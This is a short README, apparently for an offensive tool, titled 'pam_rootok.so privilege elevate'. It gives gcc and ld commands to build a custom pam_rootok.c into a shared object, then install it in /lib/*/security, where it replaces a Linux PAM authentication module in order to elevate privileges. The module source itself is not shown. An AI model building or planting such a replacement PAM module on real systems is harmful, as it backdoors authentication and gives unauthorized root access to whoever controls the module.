## pam_rootok.so privilege elevate

### compile

```
apt-get install libpam0g-dev 
# or yum install gcc pam-devel
gcc -fPIC -fno-stack-protector -c pam_rootok.c
ld -x --shared -o pam_rootok.so pam_rootok.o
```

then put it in 

```
/lib/*/security
```

Note: only test on debian 9 x64. 



### Refer

https://github.com/linux-pam/linux-pam

